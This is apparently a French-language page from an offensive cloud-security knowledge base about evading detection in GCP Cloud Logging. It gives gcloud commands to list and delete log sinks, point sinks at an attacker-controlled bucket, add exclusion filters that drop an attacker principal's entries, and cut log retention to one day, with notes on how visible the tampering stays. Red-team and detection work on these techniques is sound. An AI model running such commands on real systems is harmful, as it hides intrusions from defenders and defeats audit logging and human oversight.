---
title: "Cloud Logging : supprimer et détourner les sinks de journaux"
order: 1
description: "Supprimer ou détourner les sinks Cloud Logging et les exclusions pour retirer l'activité de l'attaquant des journaux."
keywords:
  - Cloud Logging
  - sink de journaux
  - exclusion
  - logging.sinks
  - falsification de journaux
  - évasion de détection
---

# Cloud Logging

Le Log Router envoie chaque entrée de journal à travers des **sinks** vers leurs destinations (un bucket de journalisation, Cloud Storage, BigQuery ou Pub/Sub, y compris un sink agrégé au niveau de l'organisation vers un SIEM). Le contrôle des sinks, ou des filtres d'exclusion placés devant eux, vous permet d'empêcher votre activité d'atteindre l'endroit où les défenseurs la lisent. Les permissions `logging.sinks.*` et `logging.logEntries.*` sont les leviers.

## Énumérer le routage

```bash
gcloud logging sinks list
gcloud logging sinks describe <sink>              # destination and filter
gcloud logging buckets list --location=global
```

## Supprimer la destination ou la rediriger

```bash
# delete a sink so its destination stops receiving entries
gcloud logging sinks delete <sink>

# or repoint it at a bucket you control, or one with 1-day retention
gcloud logging sinks update <sink> \
  storage.googleapis.com/<attacker-or-short-retention-bucket>
```

## Exclure uniquement votre activité

Plus discret que supprimer un sink : ajoutez un filtre d'exclusion pour que les entrées que vous êtes sur le point de générer ne soient jamais routées.

```bash
# drop entries for a principal or resource at the sink
gcloud logging sinks update _Default \
  --add-exclusion=name=x,filter='protoPayload.authenticationInfo.principalEmail="attacker@example.com"'

# or shorten retention on the _Default bucket so entries age out fast
gcloud logging buckets update _Default --location=global --retention-days=1
```

## Notes d'exploitation

- Les modifications de sinks et d'exclusions sont elles-mêmes des événements Admin Activity, qui ne peuvent pas être désactivés, de sorte que l'appel de falsification est visible même s'il arrête les entrées ultérieures ; il n'est propre que si rien ne surveille le flux Admin Activity en temps réel.
- Un **sink agrégé d'organisation ou de dossier** acheminant vers un SIEM externe est hors de portée d'un principal au niveau du projet, confirmez donc où atterrissent les journaux avant de vous fier au silence.
- Une exclusion sur `_Default` ne touche pas un sink distinct vers un SIEM ; énumérez chaque sink, pas seulement `_Default`.

## Outils

- **gcloud** (`logging sinks`, `logging buckets`) : tout ce qui précède.
- **ScoutSuite** / **Prowler** : énumérer d'abord la configuration des sinks et de la rétention.

## Références

- [HackTricks Cloud : évasion des journaux GCP](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Stratus Red Team : techniques GCP](https://stratus-red-team.cloud/attack-techniques/GCP/)
- [Google : Log Router et sinks](https://cloud.google.com/logging/docs/routing/overview)
